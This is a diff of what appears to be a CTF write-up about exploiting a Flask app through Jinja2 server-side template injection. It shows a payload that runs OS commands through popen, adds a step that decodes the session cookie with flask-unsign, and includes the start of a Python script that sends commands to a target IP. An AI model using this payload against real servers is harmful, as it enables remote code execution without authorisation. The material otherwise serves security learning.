@@ -103,13 +103,16 @@ if __name__ == '__main__':
 ```python     
 {% if session.update({1:config.__class__.__init__.__globals__[request.args.os].popen(request.args.command).read()})==1 %}{% endif %}&os=os&command=ls
 ```
+- use `flask-usign` decode session 
+
+![Screenshot from 2021-08-19 21-57-37](https://user-images.githubusercontent.com/87865134/130091714-74fddf9e-5cdf-4ef1-8c0a-7964581bd5c7.png)
+
 - Python script
 ```python
 import requests
 import flask_unsign
 
 url = 'http://142.93.35.92:31857'
-
 
 while(1):
     cmd = input("command: ")
